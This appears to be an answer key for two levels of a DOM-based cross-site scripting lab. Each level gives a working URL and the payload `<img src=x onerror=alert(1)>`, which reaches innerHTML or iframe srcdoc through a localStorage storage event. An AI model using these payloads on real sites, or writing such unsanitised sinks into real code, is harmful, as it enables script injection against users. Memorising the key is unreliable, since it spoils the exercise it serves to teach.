# storage-event — solutions

Listener iframe registers a `storage` event handler; the parent localStorage.setItem triggers the listener which sinks `newValue` / `oldValue` into innerHTML or iframe srcdoc.

### storage-event-level1

`/storage-event/level1/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: storage `event.newValue` -> output.innerHTML

### storage-event-level2

`/storage-event/level2/?seed=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: storage `event.oldValue` -> iframe srcdoc body
